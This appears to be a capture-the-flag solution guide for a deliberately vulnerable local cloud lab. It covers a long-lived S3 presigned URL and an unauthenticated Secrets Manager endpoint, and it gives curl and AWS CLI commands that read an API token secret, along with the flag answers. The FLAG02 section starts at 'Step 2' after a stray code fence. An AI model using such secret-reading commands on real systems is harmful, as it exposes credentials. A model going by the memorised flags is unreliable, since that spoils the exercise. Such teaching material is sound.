## FLAG01: Leaky Presigned URL (100 points) - Easy

### Vulnerability
Cloud Storage Misconfiguration - Overly Long S3 Presigned URLs

### What You'll Learn
- Understanding S3 presigned URL expiration policies
- Recognizing excessive access duration as a security risk
- Best practice: Presigned URLs should expire in minutes (15-60), not days

### Solution

Step 1: Discover available reports
```bash
curl http://localhost:8000/api/reports/list
```

Look for the hint in the response pointing to `/api/reports/presigned`

Step 2: Request a long-lived presigned URL
```bash
curl "http://localhost:8000/api/reports/presigned?file=internal-soc2-plan.pdf&expiry=86400"
```

Expected Response:
```json
{
  "url": "http://localstack:4566/...",
  "bucket": "dvtc-internal-reports",
  "file": "internal-soc2-plan.pdf",
  "expires_in": 86400,
  "expires_at": "2024-XX-XXT...",
  "warning": "Long-lived presigned URL generated",
  "flag": "flag{presigned_url_forever}"
}
```

Flag: `flag{presigned_url_forever}`

### Why This is Vulnerable
- Presigned URLs with 7-day expiration can be shared and remain valid long after access should be revoked
- If leaked (Slack, email, logs), attackers have days to exploit them
- Fix: Limit presigned URL expiry to 15-60 minutes maximum

```

Step 2: Read the `okta_api_token` secret
```bash
curl http://localhost:8000/api/admin/secrets/okta_api_token
```

Expected Response:
```json
{
  "secret_name": "okta_api_token",
  "arn": "arn:aws:secretsmanager:...",
  "secret_data": {
    "token": "00abcdef-flag{too_much_power}-xyz123",
    "expires": "2025-12-31"
  },
  "flag": "flag{too_much_power}",
  "message": "FLAG02: Over-permissive IAM allows reading Secrets Manager",
  "warning": "VULNERABILITY: Secrets exposed without authentication"
}
```

Flag: `flag{too_much_power}`

Alternative (Using AWS CLI):
```bash
aws --endpoint-url=http://localhost:4566 \
  secretsmanager get-secret-value \
  --secret-id okta_api_token
```

### Why This is Vulnerable
- No authentication required to access Secrets Manager
- API endpoints expose all secret names and values
- Fix: Require authentication, implement IAM policies, use service-specific credentials
